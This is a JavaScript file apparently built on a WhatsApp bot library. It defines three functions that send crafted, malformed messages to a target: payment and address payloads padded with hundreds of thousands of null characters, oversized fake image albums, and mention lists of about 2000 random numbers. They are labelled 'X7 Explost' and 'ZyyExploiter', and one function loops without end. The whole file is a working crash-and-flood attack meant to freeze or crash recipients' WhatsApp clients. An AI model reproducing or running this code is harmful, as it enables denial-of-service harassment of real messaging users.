async function marno1(sock, jid) {
  try {
    while (Date.now() - Date.now() < 200000) {
      const msg = generateWAMessageFromContent(jid, {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "calm, X7RansZvX is here",
                format: "EXTENSION_1"
              },
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: `{"values":{"in_pin_code":"999999",
                "building_name":"𝖷𝟩 𝖤𝗑𝗉𝗅𝗈𝗌𝗍",
                "landmark_area":"18",
                "address":"RansX7",
                "tower_number":"𝖷𝟩 𝖤𝗑𝗉𝗅𝗈𝗌𝗍",
                "city":"𝖷𝟩 𝖤𝗑𝗉𝗅𝗈𝗌𝗍",
                "name":"RansX7",
                "phone_number":"999999999999",
                "house_number":"13135550002",
                "floor_number":"@3135550202",
                "state":"X${"\u0000".repeat(900000)}"}}`,
                 version: 3
              },
              contextInfo: {
                forwardingScore: 9999,
                isForwarded: true,
                entryPointConversionSource: "address_message"
              }
            }
          }
        }
      }, {});

      await sock.relayMessage(jid, msg.message, { messageId: msg.key.id, participant: { jid: jid } });

  await sock.relayMessage(jid, {
    groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "calm, X7RansZvX is here",
                format: "EXTENSION_1"
              },
              nativeFlowResponseMessage: {
                name: "review_and_pay",
                paramsJson: `{\"currency\":\"IDR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":800,\"offset\":100},\"reference_id\":\"4TU82OG2957\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-2c7378a6-1643-4dba-8b2d-23e556a81ad4\",\"name\":\"${'\u0000'.repeat(50000)}\",\"amount\":{\"value\":800,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"xtx\",\"native_payment_methods\":[],\"share_payment_status\":false}`,
                version: 3
              },
              contextInfo: {
                forwardingScore: 9999,
                isForwarded: true,
                entryPointConversionSource: "payment_method"
              }
            }
          }
        }
  }, { participant: { jid: jid }});
    }
  } catch (err) {
    console.log(err);
  }
}

async function marno2(sock, jid) {
  const VariabelJid = "0@s.whatsapp.net";
  const imageMsg = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "99999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBAShIERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
    caption: "𝐙𝐲𝐲𝐄𝐱𝐩𝐥𝐨𝐢𝐭𝐞𝐫.",
    scanLengths: [
      2899999999999999077,
      1799999999999998555,
      7699999999999999148,
      1069999999999999164
    ]
  };

  let msg = generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        albumMessage: {
          expectedImageCount: 666,
          expectedVideoCount: 0,
          items: [
            { 
              imageMessage: imageMsg 
            }
          ],
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, 
              () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            stanzaId: "1234567890ABCDEF",
            businessMessageForwardInfo: {
              businessOwnerJid: VariabelJid,
            },
          },
        },
      },
    },
  }, {});
  
  await sock.relayMessage(jid, {
    groupStatusMessageV2: {
      message: msg.message,
     },
    }, ptcp ? 
    { 
      messageId: msg.key.id, 
      participant: { jid: jid } 
    } : { messageId: msg.key.id }
  );
  
  const payload = generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𝐙𝐲𝐲𝐄𝐱𝐩𝐥𝐨𝐢𝐭𝐞𝐫.", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await sock.relayMessage(jid, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: jid } 
    } : { messageId: payload.key.id }
  );
}

async function marno3(sock, jid) {
  for (let r = 0; r < 1; r++) {
    const msg = generateWAMessageFromContent(
      jid,
      {
        extendedTextMessage: {
          text: "𝐙𝐲𝐲𝐄𝐱𝐩𝐥𝐨𝐢𝐭𝐞𝐫.",
          contextInfo: {
            mentionedJid: [
              "142828328@s.whatsapp.net",
              ...Array.from(
                { length: 2000 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            quotedMessage: {
              interactiveMessage: {
                body: {
                  text: "𝐙𝐲𝐲𝐄𝐱𝐩𝐥𝐨𝐢𝐭𝐞𝐫."
                },
                nativeFlowMessage: {
                  buttons: [{ name: "payment_info", buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4UJPSC1FYKC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"¿!deadcode!¿\",\"key\":\" 🪧" + "\0".repeat(902000) + "\",\"key_type\":\"CPF\"}}],\"share_payment_status\":false}" }]
                }
              }
            }
          }
        }
      },
      {}
    );
    
    await sock.relayMessage(
      jid, 
      {
        groupStatusMessageV2: {
          message: msg.message,
        },
      }, {
        messageId: msg.key.id, 
        participant: { jid: jid },
      }
    );
  }
}

try {
  await marno1(sock, jid);
} catch {}

try {
  await marno2(sock, jid);
} catch {}

try {
  await marno3(sock, jid);
} catch {}
